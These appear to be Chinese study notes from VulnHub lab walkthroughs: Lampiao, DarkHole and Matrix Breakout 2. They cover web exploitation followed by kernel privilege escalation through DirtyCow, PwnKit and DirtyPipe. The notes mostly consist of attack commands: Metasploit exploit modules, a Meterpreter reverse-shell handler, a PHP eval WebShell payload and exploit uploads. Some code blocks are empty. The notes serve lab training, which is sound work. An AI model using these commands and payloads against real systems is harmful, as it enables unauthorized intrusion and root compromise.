## 五、内核溢出 - DirtyCow（CVE-2016-5195）

来源：
[https://www.vulnhub.com/entry/lampiao-1,249/](https://www.vulnhub.com/entry/lampiao-1,249/)

### ② 信息收集

```shell
nmap -p1-65535 192.168.88.0/24
```

### ③ Web 漏洞利用

发现 CMS
![[Pasted image 20251025164212.png]]

```
search drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set rhost 192.168.46.144
set rport 1898
run
```

![[屏幕截图 2025-10-25 164303.png]]

成功获取权限
![[屏幕截图 2025-10-25 164341.png]]

### ④ 内核漏洞检测

```

./1.sh
```

`linpeas` 扫描
![[屏幕截图 2025-10-25 165014.png]]

### ⑤ 获取 exploit 代码

来源：

```
https://github.com/gbonacini/CVE-2016-5195
```

上传 exploit：

```
upload /root/dcow.cpp /tmp/dcow.cpp
```

![[屏幕截图 2025-10-25 165954.png]]

```

![[屏幕截图 2025-10-25 170116.png]]

```

## 六、内核溢出 - Pwnkit（CVE-2021-4034）

靶场环境：
[https://www.vulnhub.com/entry/darkhole-1,724/](https://www.vulnhub.com/entry/darkhole-1,724/)

### ① 信息收集

```
nmap -p1-65535 192.168.88.0/24
```

### ② Web 漏洞利用

上传 WebShell 并反弹 Meterpreter：

```shell
use exploit/multi/handler 
set payload php/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 6666
run
```

### ③ 本地提权

```
upload /root/linux-exploit-suggester.sh /tmp/1.sh
shell
cd /tmp
chmod +x 1.sh
./1.sh
```

```

```

```

set session x
run
```

## 七、内核溢出 - DirtyPipe（CVE-2022-0847）

靶场环境：
[https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/](https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/)

### ① 信息收集

```
nmap -p1-65535 192.168.139.0/24
```

### ② Web 漏洞利用

目录扫描：

```shell
gobuster dir -u http://192.168.88.140/ -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![[屏幕截图 2025-10-25 175519.png]]

抓包写 WebShell：

```
message=<?php eval($_POST["pass"]);?>&file=xd.php
```

反弹 Shell：

```shell
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 6666
run
```

![[屏幕截图 2025-10-25 180059.png]]

### ③ 本地提权

上传：

```
upload /root/linux-exploit-suggester.sh /tmp/1.sh
```

执行：

```
cd /tmp
chmod +x 1.sh
./1.sh
```

![[屏幕截图 2025-10-25 180208.png]]

使用 MSF：

```
search cve_2022_0847
use exploit/linux/local/cve_2022_0847_dirtypipe
set session x
set lhost xx.xx.xx.xx
run
```

![[屏幕截图 2025-10-25 180612.png]]
